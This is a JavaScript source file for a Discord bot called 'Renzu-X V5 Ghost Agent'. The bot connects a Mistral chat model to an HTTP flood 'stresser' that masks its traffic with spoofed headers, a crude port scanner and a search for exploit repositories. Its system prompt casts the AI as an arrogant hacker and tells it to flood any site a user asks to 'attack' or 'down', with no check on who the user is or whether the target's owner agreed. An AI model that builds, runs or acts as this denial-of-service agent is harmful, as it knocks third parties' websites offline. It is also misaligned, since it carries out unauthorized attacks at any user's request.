import 'dotenv/config';
import { Client, GatewayIntentBits } from 'discord.js';
import MistralClient from '@mistralai/mistralai';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import net from 'net';
import express from 'express';

const DEVELOPER_ID = '1104652354655113268';
const PREFIX = '!'; 

const app = express();
app.get('/', (req, res) => res.send('RENZU-X V5: GHOST AGENT ONLINE.'));
app.listen(process.env.PORT || 3000);

const uri = process.env.MONGODB_URI;
const mongoClient = uri ? new MongoClient(uri) : null;
let db, knowledgeCache = []; 

async function connectDB() {
    if (!uri) return;
    try {
        await mongoClient.connect();
        db = mongoClient.db('renzu_database');
        const docs = await db.collection('knowledge_base').find().sort({ timestamp: -1 }).limit(10).toArray();
        knowledgeCache = docs.map(d => d.info);
    } catch (err) { console.error('❌ DB Fail'); }
}
connectDB();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});
const mistral = new MistralClient(process.env.MISTRAL_API_KEY);

// --- 🛡️ ANONYMITY HELPER ---
const getGhostHeader = () => ({
    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 100}.0.0.0 Safari/537.36`,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'X-Forwarded-For': Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.'), // Masked IP
    'Cache-Control': 'no-cache'
});

// --- 🛠️ GHOST ARSENAL ---
const tools = {
    async ghostScan(target) {
        const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET SPOTTED**: \`${host}\` is vulnerable.`); });
            socket.on('error', () => resolve(`🛡️ **GHOSTED**: \`${host}\` is behind a firewall.`));
            socket.connect(80, host);
        });
    },

    // 🌩️ DOS STRESSER (HTTP FLOOD)
    async dosStresser(target, duration = 30) {
        const fullUrl = target.startsWith('http') ? target : `https://${target}`;
        let count = 0;
        const interval = setInterval(async () => {
            try {
                await axios.get(fullUrl, { headers: getGhostHeader(), timeout: 2000 });
                count++;
            } catch (e) { /* Stealth mode: ignore errors */ }
        }, 100);

        setTimeout(() => clearInterval(interval), duration * 1000);
        return `🌩️ **STRESS TEST STARTED**: Targeting \`${target}\` for ${duration}s. Traffic is masked via Ghost-Headers.`;
    },

    async huntExploits(query) {
        try {
            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit`, { headers: getGhostHeader() });
            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
        } catch (e) { return "❌ Recon blocked."; }
    }
};

// --- 🧠 GHOST AGENT BRAIN ---
async function runGhostAgent(message, input, isDev) {
    const systemPrompt = `IDENTITY: Renzu-X V5 Ghost Agent. Hinglish. Arrogant Hacker. 
    You have tools: ghostScan, dosStresser, huntExploits.
    If user wants to attack/stress/down a site, use dosStresser.
    Always maintain anonymity. Do not reveal internal paths. Developer: ${DEVELOPER_ID}.`;

    try {
        const res = await mistral.chat({
            model: 'mistral-large-latest',
            messages: [{ role: 'system', content: systemPrompt }, { role: 'user', content: input }]
        });
        
        let reply = res.choices[0].message.content;
        const lowIn = input.toLowerCase();

        if (lowIn.includes('scan')) {
            const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
            if (target) reply += `\n\n**[SHADOW_SCAN]**:\n${await tools.ghostScan(target[0])}`;
        }
        
        if (lowIn.includes('stress') || lowIn.includes('down') || lowIn.includes('attack')) {
            const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
            if (target) reply += `\n\n**[STRESSER_LOG]**:\n${await tools.dosStresser(target[0])}`;
        }

        if (lowIn.includes('hunt') || lowIn.includes('find')) {
            reply += `\n\n**[GH_INTEL]**:\n${await tools.huntExploits(input)}`;
        }

        return message.reply(reply.substring(0, 2000));
    } catch (e) { return message.reply("⚠️ Core Shield Active. Request Denied."); }
}

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const input = message.content.slice(PREFIX.length).trim();
    if (!input) return;

    await message.channel.sendTyping();
    await runGhostAgent(message, input, message.author.id === DEVELOPER_ID);
});

client.once('ready', () => console.log('👻 RENZU-X V5: GHOST AGENT ARMED.'));
client.login(process.env.DISCORD_TOKEN);
